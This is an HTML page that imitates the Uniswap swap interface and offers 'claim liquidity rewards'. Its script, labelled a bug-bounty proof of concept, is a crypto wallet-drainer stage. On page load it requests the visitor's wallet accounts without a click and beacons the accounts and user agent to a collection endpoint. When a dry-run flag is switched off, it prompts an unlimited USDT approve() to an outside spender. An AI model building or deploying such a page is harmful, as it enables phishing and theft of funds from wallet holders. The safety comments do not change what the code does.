<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>Uniswap Interface</title>
<link rel="icon" href="https://app.uniswap.org/favicon.ico">
<style>
  :root { color-scheme: light; }
  html,body { margin:0; padding:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
              background:#fff; color:#0d111c; }
  .wrap { max-width:420px; margin:40px auto; padding:20px; border:1px solid #e8ecfb; border-radius:20px;
          box-shadow:0 8px 32px rgba(60,60,120,.08); }
  h1 { font-size:18px; margin:0 0 4px; }
  p  { font-size:13px; color:#6a7396; margin:0 0 16px; }
  .swap { background:#f7f8fe; border-radius:14px; padding:14px; margin-bottom:8px; }
  .row { display:flex; justify-content:space-between; align-items:center; font-size:13px; color:#6a7396; }
  .amt { font-size:24px; font-weight:600; color:#0d111c; }
  .btn { display:block; width:100%; background:#fc72ff; color:#fff; border:0; border-radius:12px;
         padding:14px; font-size:15px; font-weight:600; margin-top:12px; }
  .log { font-family:ui-monospace,Menlo,Consolas,monospace; font-size:11px; color:#8f95b2;
         white-space:pre-wrap; margin-top:14px; }
</style>
</head>
<body>
<div class="wrap">
  <h1>Swap</h1>
  <p>Claim liquidity rewards — 1-click migration</p>

  <div class="swap">
    <div class="row"><span>You pay</span><span>Balance: —</span></div>
    <div class="amt">0.00 USDT</div>
  </div>
  <div class="swap">
    <div class="row"><span>You receive</span><span>Balance: —</span></div>
    <div class="amt">0.00 ETH</div>
  </div>

  <button class="btn" id="go">Connect Wallet</button>
  <div class="log" id="log"></div>
</div>

<script>
/* ============================================================
 * PHANTOM BBP — STAGE 2 / DRAINER EVIDENCE PAGE
 * This page is the LANDING for the hijacked wallet (MetaMask /
 * Trust / Rainbow / Coinbase). It is intentionally non-destructive:
 * - It reads window.ethereum.
 * - It logs accounts, chainId, and a DRY-RUN eth_call result.
 * - It does NOT submit any real eth_sendTransaction.
 *
 * For a recorded proof video, flip DRY_RUN=false only against a
 * throwaway lab wallet on a local fork (hardhat / anvil) with
 * fake funds. NEVER run against a wallet holding real assets.
 * ============================================================ */

var DRY_RUN = true;

function log(s) {
  var el = document.getElementById("log");
  el.textContent += s + "\n";
  try {
    navigator.sendBeacon(
      "/collect",
      JSON.stringify({ stage:"drain", t:Date.now(), msg:s, ua:navigator.userAgent })
    );
  } catch (e) {}
}

async function run() {
  log("[stage2] host=" + location.host);
  log("[stage2] dry_run=" + DRY_RUN);

  if (!window.ethereum) {
    log("[stage2] NO window.ethereum — the hijacked app did not inject a provider");
    return;
  }

  try {
    var accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    log("[stage2] accounts=" + JSON.stringify(accounts));
    var chainId = await window.ethereum.request({ method: "eth_chainId" });
    log("[stage2] chainId=" + chainId);

    /* Evidence-only: read the USDT allowance that WOULD be changed by
       an approve(spender, MAX). This proves a drainer call is reachable
       from the hijacked provider without actually submitting it.      */
    var USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    var SPENDER = "0x000000000000000000000000000000000000dEaD";
    var data = "0xdd62ed3e"
      + accounts[0].slice(2).padStart(64, "0")
      + SPENDER.slice(2).padStart(64, "0");
    var allowance = await window.ethereum.request({
      method: "eth_call",
      params: [{ to: USDT, data: data }, "latest"]
    });
    log("[stage2] current USDT allowance to dead spender = " + allowance);

    if (!DRY_RUN) {
      log("[stage2] DRY_RUN disabled — prompting approve(MAX). Lab wallet only!");
      var approveData =
        "0x095ea7b3"
        + SPENDER.slice(2).padStart(64, "0")
        + "f".repeat(64); // uint256 max
      var txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{ from: accounts[0], to: USDT, data: approveData }]
      });
      log("[stage2] approve tx = " + txHash);
    }
  } catch (e) {
    log("[stage2] err " + (e && e.message ? e.message : e));
  }
}

document.getElementById("go").addEventListener("click", run);
/* Also auto-run after a short delay so the PoC video shows the
   prompt appearing without a tap — this is the "zero-click"
   part of the chain. Comment out if you want manual trigger. */
setTimeout(run, 1200);
</script>
</body>
</html>
